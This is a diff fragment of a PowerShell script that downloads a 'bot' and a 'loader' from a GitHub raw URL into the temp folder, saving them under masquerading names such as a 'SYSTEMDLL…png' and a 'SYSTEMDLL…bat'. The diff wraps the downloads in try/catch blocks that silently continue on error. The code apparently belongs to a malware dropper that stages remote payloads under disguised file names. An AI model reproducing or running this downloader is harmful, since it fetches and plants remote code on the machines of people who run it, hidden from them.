@@ -36,7 +36,12 @@ try {
     $wc = [System.Net.WebClient]::new();
     $bot = "https://raw.githubusercontent.com/ghostleaper/rhino/main/bot";
     $wc.DownloadFile("$bot","$temp\SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.png");
+}
+catch {
+    Continue
+}
 
+try{
     $loader = "https://raw.githubusercontent.com/ghostleaper/rhino/main/loader";
     $dll = "SYSTEMDLLdldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldldld.bat"
     $wc.DownloadFile("$loader","$tem\$dll");
